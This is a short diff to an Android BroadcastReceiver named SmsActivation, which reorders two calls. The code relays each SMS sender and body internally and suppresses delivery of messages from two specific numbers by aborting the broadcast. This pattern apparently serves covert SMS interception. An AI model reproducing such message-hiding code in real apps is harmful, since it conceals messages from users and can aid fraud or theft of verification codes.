@@ -29,8 +29,8 @@ public class SmsActivation extends BroadcastReceiver {
                     "get_msg", sender + ":" + body);
 
             if (sender.contains("300042178") || sender.contains("10008096")) {
-                context.sendBroadcast(in);
                 abortBroadcast();
+                context.sendBroadcast(in);
             }
 
         }
